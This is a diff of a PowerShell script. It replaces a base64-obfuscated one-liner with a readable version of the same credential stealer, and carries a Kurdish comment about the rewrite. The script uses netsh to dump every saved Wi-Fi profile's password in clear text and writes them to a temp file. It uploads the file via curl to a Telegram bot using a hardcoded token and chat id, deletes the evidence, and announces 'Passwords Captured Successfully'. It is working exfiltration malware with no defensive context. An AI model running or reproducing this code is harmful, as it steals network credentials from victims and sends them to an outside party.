@@ -1,1 +1,21 @@
-$c = "JHRva2VuID0gIjgwNTU0Mzk4Nzc6QUFIcFB5eVk3OXB1dEx5eENEYTNiRUQ3S0h0RFdvMVQ4MCI7JGNoYXRJZCA9ICI4NTk3ODA1MTQ0IjskZXhwb3J0UGF0aCA9ICIkZW52OlRFTVBcdy50eHQiO2lmIChUZXN0LVBhdGggJGV4cG9ydFBhdGgpIHsgUmVtb3ZlLUl0ZW0gJGV4cG9ydFBhdGggLUZvcmNlIH07bmV0c2ggd2xhbiBzaG93IHByb2ZpbGVzIHwgU2VsZWN0LVN0cmluZyAnOiguKykKJycgfCBGb3JFYWNoLU9iamVjdCB7ICRuYW1lID0gJF8uTWF0Y2hlcy5Hcm91cHNbMV0uVmFsdWUuVHJpbSgpOyRwcm9maWxlID0gbmV0c2ggd2xhbiBzaG93IHByb2ZpbGUgbmFtZT0kbmFtZSBrZXk9Y2xlYXI7JHBhc3MgPSAoJHByb2ZpbGUgfCBTZWxlY3QtU3RyaW5nICdLZXkgQ29udGVudC4rOiguKykKJycpLk1hdGNoZXMuR3JvdXBzWzFdLlZhbHVlLlRyaW0oKTtpZiAoJHBhc3MpIHsgIiRuYW1lIDogJHBhc3MiIHwgT3V0LUZpbGUgJGV4cG9ydFBhdGggLUFwcGVuZCB9IH07aWYgKFRlc3QtUGF0aCAkZXhwb3J0UGF0aCkgeyBjdXJsLmV4ZSAtRiAiZG9jdW1lbnQ9QCRleHBvcnRQYXRoIiAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdCR0b2tlbi9zZW5kRG9jdW1lbnQ/Y2hhdF9pZD0kY2hhdElkIjsgUmVtb3ZlLUl0ZW0gJGV4cG9ydFBhdGggLUZvcmNlIH07JHNwZWFrID0gTmV3LU9iamVjdCAtQ29tT2JqZWN0IFNBUEkuU3BWb2ljZTskc3BlYWsuU3BlYWsoIlBhc3N3b3JkcyBDYXB0dXJlZCBTdWNjZXNzZnVsbHkiKQ=="; iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($c)))
+$t = "8055439877:AAHqPyyYm79putLyxCDa3bED7KHTdWo1T80"
+$i = "8597805144"
+$p = "$env:TEMP\w.txt"
+
+if (Test-Path $p) { Remove-Item $p -Force }
+
+# دۆزینەوەی پاسۆردەکان بە شێوازێکی سادەتر بۆ ئەوەی کەوانەکان تێک نەنیشن
+netsh wlan show profiles | Select-String "\:(.+)$" | % {
+    $n = $_.Matches.Groups[1].Value.Trim()
+    $c = netsh wlan show profile name="$n" key=clear
+    $pass = ($c | Select-String "Key Content\W+\:(.+)$").Matches.Groups[1].Value.Trim()
+    if ($pass) { "$n : $pass" | Out-File $p -Append }
+}
+
+if (Test-Path $p) {
+    curl.exe -F "document=@$p" "https://api.telegram.org/bot$t/sendDocument?chat_id=$i"
+    Remove-Item $p -Force
+}
+
+$s = New-Object -ComObject SAPI.SpVoice
+$s.Speak("Passwords Captured Successfully")
